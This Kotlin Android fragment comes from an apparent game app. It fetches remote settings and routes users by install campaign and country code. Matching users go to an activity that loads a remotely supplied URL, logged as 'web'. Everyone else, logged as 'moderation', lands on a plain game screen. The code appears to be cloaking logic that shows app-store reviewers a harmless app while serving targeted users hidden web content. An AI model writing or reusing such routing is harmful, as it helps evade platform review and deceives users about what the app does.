package com.sunsetgames.bordersecurit.main.ui.frag

import android.content.Intent
import android.content.SharedPreferences
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import com.sunsetgames.bordersecurit.ApplCla
import com.sunsetgames.bordersecurit.ApplCla.Companion.C1
import com.sunsetgames.bordersecurit.ApplCla.Companion.appsCheckChe
import com.sunsetgames.bordersecurit.ApplCla.Companion.urlMain
import com.sunsetgames.bordersecurit.R
import com.sunsetgames.bordersecurit.main.ui.Elemental
import com.sunsetgames.bordersecurit.main.ui.MainViewModel
import com.sunsetgames.bordersecurit.main.ui.Volcano
import org.koin.android.ext.android.inject
import org.koin.androidx.viewmodel.ext.android.viewModel
import org.koin.core.qualifier.named
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit


class SecondMainFragment : Fragment() {

    val viewMainModel by viewModel<MainViewModel>()
    val shareP: SharedPreferences by inject(named("SharedPreferences"))

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        sortingShit()
    }

    fun sortingShit() {

        var appsG: String
        var geoC: String
        var linkk: String
        var countryC: String
        val executorService = Executors.newSingleThreadScheduledExecutor()

        viewMainModel.devData.observe(this) {
            if (it!=null) {
                appsG = viewMainModel.devData.value?.appsChecker ?: "null"
                geoC = viewMainModel.devData.value?.geo ?: "null"
                linkk = viewMainModel.devData.value?.view ?: "null"

                Log.d("DATATA", "sortingShit: $appsG, $geoC, $linkk ")
                var appsCamp = shareP.getString(C1, null)
                shareP.edit().putString(appsCheckChe, appsG).apply()
                countryC = shareP.getString("countryCode", null).toString()
                shareP.edit().putString(ApplCla.urlMain, linkk).apply()



                if (appsG == "1") {
                    executorService.scheduleAtFixedRate({
                        if (appsCamp != null) {
                            Log.d("AppsChecker", "$appsCamp ")
                            executorService.shutdownNow()
                            if (appsCamp!!.contains("tdb2") || geoC.contains(countryC)) {
                                Log.d("CheckApps", "web")

                                val intent = Intent(activity, Elemental::class.java)
                                startActivity(intent)
                                activity?.finish()
                            } else {
                                val intent = Intent(activity, Volcano::class.java)
                                startActivity(intent)
                                activity?.finish()
                                Log.d("CheckApps", "moderation")
                            }
                        }
                         else {
                            Log.d("AppsChecker", "$appsCamp")
                            appsCamp = shareP.getString(C1, null)
                        }
                    }, 0, 1, TimeUnit.SECONDS)

                } else {
                    if (countryC.let { geoC.contains(it) }) {
                        Log.d("CheckApps", "web")
                        if(shareP.getString(urlMain, "") != null) {
                            val intent = Intent(activity, Elemental::class.java)
                            startActivity(intent)
                            activity?.finish()
                        } else {
                            shareP.getString(urlMain, "")
                        }
                    } else {
                        val intent = Intent(activity, Volcano::class.java)
                        startActivity(intent)
                        activity?.finish()
                        Log.d("CheckApps", "moderation")
                    }
                }

            }
        }
    }


    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        // Inflate the layout for this fragment
        return inflater.inflate(R.layout.fragment_second_main, container, false)
    }
}

